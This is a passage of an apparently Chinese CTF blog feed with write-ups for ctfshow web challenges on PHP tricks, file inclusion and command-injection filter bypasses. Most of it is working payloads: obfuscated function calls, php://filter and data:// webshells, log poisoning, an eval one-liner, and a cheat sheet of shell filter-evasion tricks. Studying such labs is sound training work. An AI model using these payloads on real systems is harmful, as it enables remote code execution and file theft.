class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">md5(md5())</span><br><span class="line">md5(phpinfo())</span><br></pre></td></tr></table></figure><h3 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h3><p>取反运算</p><h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><p>v1=0</p><h3 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h3><p>异或运算，加减被过滤，用乘除也可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">v1=<span class="number">1</span>&amp;v3=*(<span class="string">"%0c%06%0c%0b%05%0d"</span>^<span class="string">"%7f%7f%7f%7f%60%60"</span>)(<span class="string">"%0b%01%03%00%06%00"</span>^<span class="string">"%7f%60%60%20%60%2a"</span>)*&amp;v2=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">v1=<span class="number">1</span>&amp;v3=-&amp;v2=(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)</span><br></pre></td></tr></table></figure><h3 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h3><p>三目运算符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">v1=<span class="number">1</span>&amp;v3=?(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5):&amp;v2=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h3><p>新增过滤了冒号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3===(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)||&amp;v2=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'ctf'</span>]))&#123;</span><br><span class="line">    $ctfshow = $_POST[<span class="string">'ctf'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,$ctfshow)) &#123;</span><br><span class="line">        $ctfshow(<span class="string">''</span>,$_GET[<span class="string">'show'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>create_function()</code>函数注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:show=<span class="keyword">echo</span> <span class="number">123</span>;&#125;system(<span class="string">'tac flag.php'</span>);<span class="comment">//</span></span><br><span class="line">POST:ctf=%<span class="number">5</span>ccreate_function</span><br></pre></td></tr></table></figure><p>要绕过正则，不外乎%0a,%5c绕过，这里%5c可以绕过</p><h3 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h3><p>异或，这里还可以先异或构造出<code>_GET</code>，再利用中文字符</p><h3 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h3><p>写入index.php</p><p>预期解：条件竞争，用burp</p><h3 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h3><p>日志文件包含</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php特性
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>filecontains</title>
    <link href="http://yoursite.com/2020/09/24/filecontains/"/>
    <id>http://yoursite.com/2020/09/24/filecontains/</id>
    <published>2020-09-24T12:19:35.000Z</published>
    <updated>2020-10-04T07:26:46.954Z</updated>
    
    <content type="html"><![CDATA[<h3 id="filecontain"><a href="#filecontain" class="headerlink" title="filecontain"></a>filecontain<a id="more"></a></h3><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件包含，没有给出回显</p><p>尝试伪协议包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>匹配到php就会被替换，这里可以用data协议写入命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line">(attention:加密最好用本地工具，网上加密有区别)</span><br></pre></td></tr></table></figure><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>data协议也不能用了，这里想到可能可以通过写入日志文件进行包含来<code>getshell</code>，burp抓包修改UA</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line">UA:<span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span><span class="comment">//<span class="meta">&lt;?php</span> system('cat fl0g.php');<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><img src="/2020/09/24/filecontains/1.png" class=""><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多过滤了个冒号，上题方法打通</p><h3 id="web82-web86"><a href="#web82-web86" class="headerlink" title="web82-web86"></a>web82-web86</h3><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $content = $_POST[<span class="string">'content'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"."</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    file_put_contents(urldecode($file), <span class="string">"&lt;?php die('大佬别秀了');?&gt;"</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的知识点，<code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code>，很详细</p><p>使用base64进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?file=php:<span class="comment">//filter/write=convert.base64-decode/resource=xxx.php</span></span><br><span class="line">POST: content=aaPD9waHAgIGV2YWwoJF9QT1NUWzFdKTs%<span class="number">2</span>FPg%<span class="number">3</span>D%<span class="number">3</span>D</span><br><span class="line">进行url双编码</span><br><span class="line">通过base64过滤之后就只有(phpdie)<span class="number">6</span>个字符我们就要添加<span class="number">2</span>个字符让前面的可以进行编码，bases64，<span class="number">4</span>个字符一组</span><br></pre></td></tr></table></figure><img src="/2020/09/24/filecontains/2.png" class=""><p>之后再访问写入的文件路径，即可以进行命令执行</p><img src="/2020/09/24/filecontains/3.png" class=""><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br></pre></td></tr></table></figure><p>作了很多的过滤，但是冒号被放出来了，依旧可以用data协议，这里注意到等号被过滤了，加密之后的内容赋值时去掉等号即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs</span></span><br></pre></td></tr></table></figure><h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>开题是个视频，下载，foremost拿到一张源码图片</p><img src="/2020/09/24/filecontains/4.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/read=/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span>,$x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'too young too simple sometimes naive!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">$contents=$_POST[<span class="string">'contents'</span>];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, <span class="string">"&lt;?php die();?&gt;"</span>.$contents);</span><br></pre></td></tr></table></figure><p>使用其他的过滤器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.php</span></span><br><span class="line">post：contents=?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?</span><br><span class="line">    </span><br><span class="line">再访问<span class="number">1.</span>php，利用shell</span><br><span class="line">Qftm=system(<span class="string">'cat flag.php'</span>);</span><br><span class="line"></span><br><span class="line">附上文章：https:<span class="comment">//www.anquanke.com/post/id/202510#h3-15</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;filecontain&quot;&gt;&lt;a href=&quot;#filecontain&quot; class=&quot;headerlink&quot; title=&quot;filecontain&quot;&gt;&lt;/a&gt;filecontain
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>ctfshowcommand</title>
    <link href="http://yoursite.com/2020/09/22/ctfshowcommand/"/>
    <id>http://yoursite.com/2020/09/22/ctfshowcommand/</id>
    <published>2020-09-22T10:37:30.000Z</published>
    <updated>2020-09-24T11:53:53.203Z</updated>
    
    <content type="html"><![CDATA[<h3 id="command绕过"><a href="#command绕过" class="headerlink" title="command绕过"></a>command绕过<a id="more"></a></h3><h4 id="知识总结，写在前面"><a href="#知识总结，写在前面" class="headerlink" title="知识总结，写在前面"></a>知识总结，写在前面</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">分隔命令</span><br><span class="line">;<span class="comment">//分号应该是最好理解的</span></span><br><span class="line">|<span class="comment">//只执行后面那条命令</span></span><br><span class="line">||<span class="comment">//只执行前面那条命令</span></span><br><span class="line">&amp;<span class="comment">//两条命令都会执行，不知道是不是自己姿势不对，没成功，下面也是一样</span></span><br><span class="line">&amp;&amp;<span class="comment">//两条命令都会执行</span></span><br><span class="line"></span><br><span class="line">空格绕过</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;<span class="comment">//需要写的权限</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line">%<span class="number">20</span></span><br><span class="line">%<span class="number">09</span></span><br><span class="line">%<span class="number">3</span>c</span><br><span class="line">A=$<span class="string">'cat\x20flag'</span>&amp;&amp;$A</span><br><span class="line">A=$<span class="string">'cat\x09flag'</span>&amp;&amp;$A</span><br><span class="line">黑名单</span><br><span class="line"><span class="comment">//一般情况像flag、php这种字符会被ban掉，这时候就需要进行绕过了</span></span><br><span class="line">通配符</span><br><span class="line">*<span class="comment">//匹配任何文本或字符串，这个通过测试发现并不能与IFS或&lt;这两个字符一起使用</span></span><br><span class="line">?<span class="comment">//匹配单个任意字符</span></span><br><span class="line"> </span><br><span class="line">空字符</span><br><span class="line">$@<span class="comment">//ca$@t flag</span></span><br><span class="line">$<span class="number">1</span>-$<span class="number">9</span><span class="comment">//ca$1t flag</span></span><br><span class="line">$&#123;数字&#125;  <span class="comment">//ca$&#123;1&#125;t flag</span></span><br><span class="line"> </span><br><span class="line">编码绕过</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Y2F0IGZsYWcucGhwCg=="</span>|base64 -d|bash<span class="comment">//解码为cat flag.php并执行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"cat flag.php"</span>|base64<span class="comment">//最好别在在线网站编码，不然可能会将空格转成url编码，从而无法执行命令</span></span><br><span class="line"> </span><br><span class="line">变量替换</span><br><span class="line">a=t;b=g;ca$a fla$b.php</span><br><span class="line"> </span><br><span class="line">引号</span><br><span class="line">ca<span class="string">''</span>t fl<span class="string">''</span>ag.php</span><br><span class="line"></span><br><span class="line">反斜杆</span><br><span class="line"></span><br><span class="line">ca\t f\la\g.php</span><br><span class="line">Linux查看文件命令</span><br><span class="line">cat<span class="comment">//cat flag.php</span></span><br><span class="line">tac<span class="comment">//tac flag.php</span></span><br><span class="line">head<span class="comment">//head flag.php</span></span><br><span class="line">tail<span class="comment">//tail flag.php</span></span><br><span class="line">nl<span class="comment">//nl flag.php</span></span><br><span class="line">more<span class="comment">//more flag.php</span></span><br><span class="line">less<span class="comment">//less flag.php</span></span><br><span class="line">od<span class="comment">//od flag.php</span></span><br><span class="line">grep<span class="comment">//grep 'fla' flag.php</span></span><br><span class="line">strings<span class="comment">//strings flag.php</span></span><br><span class="line">sort<span class="comment">//sort flag.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</span><br><span class="line">pos()：返回数组中的当前元素的值。</span><br><span class="line">array_reverse()：数组逆序</span><br><span class="line">scandir()：获取目录下的文件</span><br><span class="line">next()： 函数将内部指针指向数组中的下一个元素，并输出。</span><br></pre></td></tr></table></figure><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/flag/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单过滤了flag,用通配符即可绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=system(<span class="string">"ls"</span>);</span><br><span class="line">c=system(<span class="string">'cat f*'</span>);</span><br></pre></td></tr></table></figure><p>下面的题目都只放核心部分</p><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以发现这里过滤了php和system,影响不大，system的替代函数有很多，像是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">exec()</span><br><span class="line"><span class="comment">#这里要注意除了system都是不会给出回显的，要用诸如echo,print_r等来带出结果</span></span><br></pre></td></tr></table></figure><p>不查看目录结构直接盲猜文件位置也是可以的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">echo</span> exec(<span class="string">'find / -name f*'</span>);</span><br><span class="line">c=<span class="keyword">echo</span> exec(<span class="string">'cat f*'</span>);</span><br></pre></td></tr></table></figure><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>新加了几个过滤，cat,sort,shell,空格等，还是很好绕过的，上面的知识总结里有，这里就不赘述了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">echo</span>(`ls`);</span><br><span class="line">c=<span class="keyword">echo</span>(`c\at%<span class="number">09</span>f*`);</span><br></pre></td></tr></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这题过滤的东西变多了，单引号，分号，打印echo等都被过滤了</p><p>这里可以尝试包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">include</span><span class="string">"/etc/passwd"</span><span class="meta">?&gt;</span></span><br><span class="line">可以成功执行，考虑写入小🐎</span><br><span class="line">c=<span class="keyword">include</span><span class="string">"$_POST[1]"</span><span class="meta">?&gt;</span></span><br><span class="line">POST:<span class="number">1</span>=/etc/passwd</span><br><span class="line">最后可以用伪协议</span><br><span class="line">c=<span class="keyword">include</span><span class="string">"$_POST[1]"</span><span class="meta">?&gt;</span></span><br><span class="line">POST:php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web33-35-payload同web32，过滤基本相同"><a href="#web33-35-payload同web32，过滤基本相同" class="headerlink" title="web33-35(payload同web32，过滤基本相同)"></a>web33-35(payload同web32，过滤基本相同)</h3><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><p>多过滤了数字，post传递的参数换成字母即可</p><h3 id="web37-同39"><a href="#web37-同39" class="headerlink" title="web37(同39)"></a>web37(同39)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>换了形式的代码，这里会对输入进行包含，这里第一反应就是写入小马，也就是利用一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#paylaod</span></span><br><span class="line">c=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>)<span class="meta">?&gt;</span></span><br><span class="line">c=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'cat f*'</span>)<span class="meta">?&gt;</span></span><br><span class="line">相当于执行了php语句<span class="meta">&lt;?php</span> system(<span class="string">'cat f*'</span>)<span class="meta">?&gt;</span>.php</span><br><span class="line">因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上</span><br></pre></td></tr></table></figure><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|php|file/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里还是能够用data伪协议绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=data:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>还可以在UA写入一句话，包含日志文件</p><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>除了字母，一些特殊字符基本都被过滤了</p><p>这道题和GXY禁止套娃解法相同，利用特殊的函数进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span 